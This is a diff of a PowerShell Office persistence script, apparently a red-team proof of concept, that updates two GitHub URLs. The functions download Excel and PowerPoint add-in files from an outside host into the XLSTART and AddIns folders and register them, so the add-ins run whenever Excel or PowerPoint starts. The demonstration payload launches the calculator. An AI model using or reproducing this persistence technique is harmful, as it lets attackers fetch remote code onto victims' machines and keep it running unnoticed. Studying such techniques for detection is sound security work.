@@ -59,7 +59,7 @@ Function ExcelVBAadd-ins
     # Release file：%appdata%\Microsoft\Excel\XLSTART\calc.xlam
     # Pop up the calculator when you start excel.exe
     $client = new-object System.Net.WebClient
-    $client.DownloadFile("https://raw.githubusercontent.com/3gstudent/test/master/calc.xlam",$env:APPDATA+"\Microsoft\Excel\XLSTART\calc.xlam")
+    $client.DownloadFile("https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.xlam",$env:APPDATA+"\Microsoft\Excel\XLSTART\calc.xlam")
 }
 
 Function PowerPointVBAadd-ins
@@ -70,7 +70,7 @@ Function PowerPointVBAadd-ins
     # Create registry key:HKCU\Software\Microsoft\Office\14.0\PowerPoint\AddIns\calc Path REG_SZ calc.ppa
     # Pop up the calculator when you start powerpoint.exe
     $client = new-object System.Net.WebClient
-    $client.DownloadFile("https://raw.githubusercontent.com/3gstudent/test/master/calc.ppa",$env:APPDATA+"\Microsoft\AddIns\calc.ppa")
+    $client.DownloadFile("https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.ppa",$env:APPDATA+"\Microsoft\AddIns\calc.ppa")
     Try  
     {  
         $OfficeVersion=dir -name "C:\Program Files\Microsoft Office\Office*" -ErrorAction Stop  
